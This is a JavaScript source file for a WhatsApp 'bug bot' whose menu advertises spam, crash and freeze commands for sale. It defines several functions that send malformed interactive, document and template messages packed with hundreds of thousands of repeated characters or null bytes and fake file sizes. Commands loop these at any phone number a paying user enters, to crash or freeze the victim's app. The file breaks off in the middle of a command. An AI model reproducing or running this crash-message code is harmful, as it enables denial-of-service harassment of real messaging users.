module.exports = async (Dantzyy, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
/*const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : */
const prefix = "."
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const To = ["https://files.catbox.moe/nvahuu.jpg", "https://files.catbox.moe/qptm2d.jpg", "https://files.catbox.moe/kig98h.png", "https://files.catbox.moe/vqzejz.jpg"]
const ytta = To[Math.floor(Math.random() * To.length)]
const Kntl = ["https://files.catbox.moe/euoe9y.mp4"]
const C2 = Kntl[Math.floor(Math.random() * Kntl.length)]
const Tol = ["https://files.catbox.moe/x5ksnq.mp3", "https://files.catbox.moe/74rl6x.mp3", "https://files.catbox.moe/jiadzd.mp3", "https://files.catbox.moe/3rjvwf.mp3", "https://files.catbox.moe/2r5gam.mp3"]
const ytt = Tol[Math.floor(Math.random() * Tol.length)]
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const Premium = JSON.parse(fs.readFileSync('./Databases/database/murbug.json'))
const owner = JSON.parse(fs.readFileSync('./Databases/database/owner.json'))
const pantek = ["https://files.catbox.moe/x5ksnq.mp3"]
const sound1 = pantek[Math.floor(Math.random() * pantek.length)]
const Toll = ["https://files.catbox.moe/74rl6x.mp3"]
const sound2 = Toll[Math.floor(Math.random() * Toll.length)]
const Tolll = ["https://files.catbox.moe/jiadzd.mp3"]
const sound3 = Tolll[Math.floor(Math.random() * Tolll.length)]
const Mek = ["https://files.catbox.moe/3rjvwf.mp3"]
const sound4 = Mek[Math.floor(Math.random() * Mek.length)]
const wdh = ["https://files.catbox.moe/2r5gam.mp3"]
const sound5 = wdh[Math.floor(Math.random() * wdh.length)]
const pol = ["https://files.catbox.moe/hzx3x9.m4a"]
const sound6 = pol[Math.floor(Math.random() * pol.length)]
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const jsobfus = require('javascript-obfuscator');
const botNumber = await Dantzyy.decodeJid(Dantzyy.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const kontol = m.key.fromMe ? Dantzyy.user.id.split(':')[0x0] + '@s.whatsapp.net' || Dantzyy.user.id : m.key.participant || m.key.remoteJid;
const isGroup = m.chat.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await Dantzyy.groupMetadata(m.key.remoteJid) : {}
let participant_bot = (isGroup ? groupMetadata.participants.find((v) => v.id == m.botNumber) : {}) || {}
let participant_sender = (isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}) || {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const qtext = q = args.join(" ")
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./Databases/function.js')
const VidNye = fs.readFileSync('./Dantzy.mp4')
const antilink = JSON.parse(fs.readFileSync('./Databases/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./Databases/database/antilink2.json'))
const contacts = JSON.parse(fs.readFileSync("./Databases/database/contacts.json"))
const kosong = fs.readFileSync("./Databases/kosong.jpg")
const { teksbug1 } = require("./Databases/database/virtex.js")
const { teksbug2 } = require("./Databases/database/delay.js")
const { buttonvirus } = require("./Databases/database/buttonvirus.js")
const { explosion } = require("./Databases/vir/bugcrash.js")
const { Veoni } = require("./Databases/vir/xnaf.js")
const { old1, old2, old3 } = require("./Databases/vir/bugold.js")
const { Cluex } = require("./Databases/database/ClueX.js")
const { pinterest, pinterest2, mediafire, tiktokDl } = require('./Databases/scraper');

/*FUNCTION OBFUSCATE*/
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Dantzy`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}


if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(owner), color(`[ MESSAGE ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `CʀʏɴᴢX Fᴏʀᴄᴇ`
}}}

if (isGroup) {
if (antilink.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await Dantzyy.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Dantzyy.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://h.top4top.io/p_3220inuij9.png", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await Dantzyy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await Dantzyy.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}}

if (isGroup) {
if (antilink2.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await Dantzyy.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Dantzyy.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://files.catbox.moe/1gjpod.jpg", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await Dantzyy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Bot Whatsapp Realtime`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `𝘟 - 𝘈𝘗𝘌𝘐𝘙𝘖𝘛𝘡𝘠`,jpegThumbnail: ""}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363373147323256@newsletter`,
newsletterName: `𝘋𝘢𝘯𝘵𝘻𝘺`,
jpegThumbnail: "https://files.catbox.moe/nvahuu.jpg",
caption: `𝘈𝘗𝘌𝘐𝘙𝘖𝘛𝘡𝘠`,
inviteExpiration: Date.now() + 1814400000
}
}}

const Out = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid :"status@broadcast"
 }: {})},
 message:
 {"orderMessage":
 {"orderId":"174238614569438",
 "thumbnailUrl": kosong, //image 0kb
 "itemCount": '777777777',
 "status":
 "INQUIRY",
 "surface": "CATALOG",
 "message": `DantzyTheKing👑😈`,
 "token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" }},
 contextInfo: {"mentionedJid":m.sender.split, "forwardingScore":999,"isForwarded":true}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `APEIROTZY`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6283840073203:+6283840073203\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

Dantzyy.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}


/*FUNC BY DANTZY*/
const Null = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "\0".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    async function Bug1(target, ptcp = false) {
      let virtex = "𝘈𝘗𝘌𝘐𝘙𝘖\n𝘚𝘜𝘗𝘌𝘙𝘊𝘙𝘈𝘚𝘏" + "ꦾ".repeat(90000) + "@6283840073203".repeat(50000);
      await Dantzyy.relayMessage(target, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "DantzyTheKing😈",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: "https://files.catbox.moe/uk38k6.jpg"
                },
                hasMediaAttachment: true
              },
              body: {
                text: virtex
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: ["6283840073203@s.whatsapp.net"],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "Bokep 18+",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: "https://files.catbox.moe/uk38k6.jpg"
                  }
                }
              }
            }
          }
        }
      }, ptcp ? {
        participant: {
          jid: target,
          quoted: Null
        }
      } : {});
      console.log(chalk.yellow.bold(`SENDER BUG TO TARGET ${target}`));
    }

/*BUG SENDER CRASH HARD*/
async function Bug2(target, ptcp = false) {
    let akumw = "DantzyTheKing👑😈" + "ꦿꦾ꧀".repeat(50000);
    await Dantzyy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: " TrashDex Explanation ",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: akumw
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function locasifreeze2(nomor, ptcp = false) {
    await Dantzyy.relayMessage(nomor, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Dantzy Ryuichi ϟ" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: nomor } }, { messageId: null });
}

async function HyperFloodCrash(nomor, ptcp = false) {
    const hyperFloodMessage = {
        templateMessage: {
            hydratedTemplate: {
                hydratedHeaderText: "🚨 ALERT: SYSTEM FAILURE 🚨",
                hydratedFooterText: "⚠️ CRASH IMMINENT ⚠️",
                hydratedContentText: "💣".repeat(20000) + "💥".repeat(15000),
                hydratedButtons: Array.from({ length: 5 }, (_, i) => ({
                    quickReplyButton: {
                        displayText: `Button ${i + 1}`,
                        id: `button-${i + 1}`,
                    },
                })),
            },
        },
    };
    // floodnya, bisa atur sesuai mau mu, ubah aja 100 jadi misal 
    // 20/10
    for (let i = 0; i < 15; i++) {
        try {
            await Dantzyy.relayMessage(
                nomor,
                hyperFloodMessage,
                {
                    participant: { jid: nomor },
                    messageId: null,
                }
            );
            console.log(`Sending Hydrated By Dantzy Developer`);
        } catch (error) {
            console.error(`Error Bang : ${i + 1}: ${error.message}`);
        }

       
        await new Promise(resolve => setTimeout(resolve, 2000));
    }

    console.log("Attacking HyperFlood selesai");
}

async function freezefile(nomor, ptcp = false) {
    let virtex = "⭑̤⟅̊༑ ▾ 𝐃͙𝐀͢𝐍𝐓͢𝐙͛𝐘 ⿻ 𝐕𝐈͢𝐒𝐈͢𝐎͛𝐍 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "@0".repeat(250000);
    await Dantzyy.relayMessage(nomor, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "⭑̤⟅̊༑ ▾ 𝐃͙𝐀͢𝐍𝐓͢𝐙͛𝐘 ⿻ 𝐕𝐈͢𝐒𝐈͢𝐎͛𝐍 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: nomor } }, { messageId: null });
}

const reply = bokep => {
      Dantzyy.sendMessage(m.chat, {
        'text': bokep,
        'contextInfo': {
          'mentionedJid': [kontol],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': "DantzyDev",
            'body': `${global.own}`,
            'previewType': "PHOTO",
            'thumbnailUrl': 'https://files.catbox.moe/vqzejz.jpg',
            'sourceUrl': ''
          }
        }
      }, {
        'quoted': qkontak
      });
    };

switch (command) {

case "menu": case "danz": {
const tampilan = `
Creator : ${global.own}
𝗩ersion : ${global.ver}
Runtime : ${runtime(process.uptime())}

_Thank you for using the Dantzy script for update info you can enter my whatsapp channel ❤_  

⧎〈 𝐒𝐈𝐌𝐏𝐋𝐄 𝐌𝐄𝐍𝐔 〉
${global.log} *ownermenu*
${global.log} *showmenu*
${global.log} *clearChat*
═════════════════
`
let menu = {
video: VidNye,
gifPlayback: true,
  caption: tampilan,
  contextInfo:{externalAdReply:{
  title: 'APEIROTZY',
  body: 'Dantzy - Dev', 
  showAdAttribution: true,
  thumbnailUrl: `${ytta}`,
  mediaType: 4,
  MediaUrl: 'https://www.youtube.com/@Danzxtzy',
  sourceUrl: "https://www.youtube.com/@Danzxtzy",
  }}
  }
await Dantzyy.sendMessage(from, menu, {quoted: Out }
);
await Dantzyy.sendMessage(m.chat, {audio: {url: `${ytt}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break

case "ownermenu": {
const tampilan = `
Creator : ${global.own}
𝗩ersion : ${global.ver}
Runtime : ${runtime(process.uptime())}

_Thank you for using the Dantzy script for update info you can enter my whatsapp channel ❤_  

⧎〈 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 〉
${global.log} *self*
${global.log} *pub*
${global.log} *hidetag*
${global.log} *addacces*
${global.log} *dellacces*
═════════════════
`
let menu = {
video: VidNye,
gifPlayback: true,
  caption: tampilan,
  contextInfo:{externalAdReply:{
  title: 'APEIROTZY',
  body: 'Dantzy - 𝗗ev', 
  showAdAttribution: true,
  thumbnailUrl: `${ytta}`,
  mediaType: 4,
  MediaUrl: 'https://www.youtube.com/@Danzxtzy',
  sourceUrl: "https://www.youtube.com/@Danzxtzy",
  }}
  }
await Dantzyy.sendMessage(from, menu, {quoted: Out }
);
await Dantzyy.sendMessage(m.chat, {audio: {url: `${ytt}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break

case "showmenu": {
const tampilan = `
Creator : ${global.own}
Version : ${global.ver}
Runtime : ${runtime(process.uptime())}
  
_Thank you for using the Dantzy script for update info you can enter my whatsapp channel ❤_  
_https://whatsapp.com/channel/0029Vatje56EwEjz4EU5E11y_
  
⧎〈 NORMAL 〉
${global.log} halo ϟ InPlace
${global.log} paket ϟ InPlace
${global.log} assalamualaikum ϟ InPlace

⧎〈 SPAM 〉
${global.log} cxzs ϟ Input number
${global.log} vegasus ϟ Input number
${global.log} black ϟ Input number
${global.log} bugdoku ϟ Input number
${global.log} crashui ϟ Input number
${global.log} strom ϟ Input number

⧎〈 INFINITY 〉
${global.log} iossturztab ϟ Input number
${global.log} ios-killer ϟ Input number
${global.log} systemui ϟ Input number
${global.log} verzogerung ϟ Input number
${global.log} dokumentationen ϟ Input number

⧎〈 SPECIAL MENU 〉
${global.log} delbug ϟ Input number
${global.log} combobug ϟ Input number

⧎〈 𝗖𝗿𝗲𝗱𝗶𝘁 𝗦𝗰𝗿𝗶𝗽𝘁 〉
𝘛𝘩𝘦 𝘚𝘤𝘳𝘪𝘱𝘵 𝘞𝘢𝘴 𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 𝘋𝘢𝘯𝘵𝘻𝘺, 𝘐𝘧 𝘠𝘰𝘶 𝘞𝘢𝘯𝘵 𝘛𝘰 𝘉𝘶𝘺 𝘛𝘩𝘦 𝘚𝘤𝘳𝘪𝘱𝘵, 𝘗𝘭𝘦𝘢𝘴𝘦 𝘊𝘰𝘯𝘵𝘢𝘤𝘵 𝘛𝘩𝘦 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳
𝘔𝘺 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 : t.me/Danzxtzy`
let menu = {
video: VidNye,
gifPlayback: true,
  caption: tampilan,
  contextInfo:{externalAdReply:{
  title: 'APEIROTZY',
  body: 'Dantzy - 𝗗ev', 
  showAdAttribution: true,
  thumbnailUrl: `${ytta}`,
  mediaType: 4,
  MediaUrl: 'https://www.youtube.com/@Danzxtzy',
  sourceUrl: "https://www.youtube.com/@Danzxtzy",
  }}
  }
await Dantzyy.sendMessage(from, menu, {quoted: Out }
);
await Dantzyy.sendMessage(m.chat, {audio: {url: `${ytt}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "pub": {
if (!isCreator) return reply("Wer bist du")
Dantzyy.public = true
reply("Sie gelangen in den öffentlichen Modus")
}
break
case "self": {
if (!isCreator) return reply("Wer bist du")
Dantzyy.public = false
reply("Sie gelangen in den Selbstmodus")
}
break
case "addacces":{
if (!isCreator) return reply(`Wer bist du`)
if (!args[0]) return reply(`Benutzer ${command} Nummer\nBeispiel ${command} 49×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Dantzyy.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Bitte geben Sie die registrierte Nummer ein`)
Premium.push(prrkek)
fs.writeFileSync("./Databases/database/murbug.json", JSON.stringify(Premium))
reply(`Erfolg, ein Murbug zu werden`)
}
break
case "dellacces":{
if (!isCreator) return reply(`Wer bist du`)
if (!args[0]) return reply(`Benutzer ${command} Nummer\nBeispiel ${command} 49×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
m4 = Premium.indexOf(ya)
Premium.splice(m4, 1)
fs.writeFileSync("./Databases/database/murbug.json", JSON.stringify(Premium))
reply(`Sie werden nicht mehr verwirrt sein und möchten es erneut hinzufügen`)
}
break
case 'clearchat': {
pee = "\n\n\n".repeat(1000)
m.reply(pee + 'DantzyTheking👑😈')
}
break
case "hidetag": {
if (!isGroup) return reply(`vor allem innerhalb der Gruppe`)
if (!isCreator) return reply(`Du hast keinen Zugriff`)
if (!m.quoted && !text) return reply(`Wo ist der Text?`)
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
Dantzyy.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case 'cxzs': {
if (!isPremium) return reply("Du hast keinen Zugriff")
if (!q) return reply(`Beispiel: ${prefix + command} 49×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("‼️Prozess")
for (let i = 0; i < 10; i++) {
await Bug1(target, Ptcp = true)
await Bug2(target, Null)
await Bug1(target, Ptcp = true)
await Bug2(target, Null)
}
reply(`
‼️Erfolg
Telegramm = t.me/Danzxtzy
Abonniere mein YouTube = https://www.youtube.com/@Danzxtzy
`)
}
break

case 'vegasus': case "black": case "bugdoku": {
if (!isPremium) return reply("Sie haben keinen Zugriff")
if (!q) return reply(`Beispiele: ${prefix + command} 49×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("‼️Prozess")
for (let i = 0; i < 10; i++) {
await Bug1(target, Ptcp = true)
await Bug2(target, Null)
}
reply(`
‼️Erfolg
Telegramm = t.me/Danzxtzy
Abonniere mein YouTube = https://www.youtube.com/@Danzxtzy
`)
}
break

case 'crashui': {
if (!isPremium) return reply("Sie haben keinen Zugriff")
if (!q) return reply(`‼️Prozess: ${prefix + command} 49×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("‼️Prozess")
for (let i = 0; i < 10; i++) {
await Bug1(target, Ptcp = true)
await Bug2(target, Null)
}
reply(`
‼️Erfolg
Telegramm = t.me/Danzxtzy
Abonniere mein YouTube = https://www.youtube.com/@Danzxtzy
`)
}
break
case 'strom': {
if (!isPremium) return reply("Sie haben keinen Zugriff")
if (!q) return reply(`Beispiele: ${prefix + command} 49×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("‼️Prozess")
for (let i = 0; i < 15; i++) {
await Bug1(target, Ptcp = true)
await Bug2(target, Null)
}
reply(`
‼️Erfolg
Telegramm = t.me/Danzxtzy
Abonniere mein YouTube = https://www.youtube.com/@Danzxtzy
`)
}
break
case 'delbug': {
if (!isOwner) return xpaytod(" Khusus Premium")
if (!q) return m.reply(`Example:\n ${prefix + command} 62xxxx`)
id = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
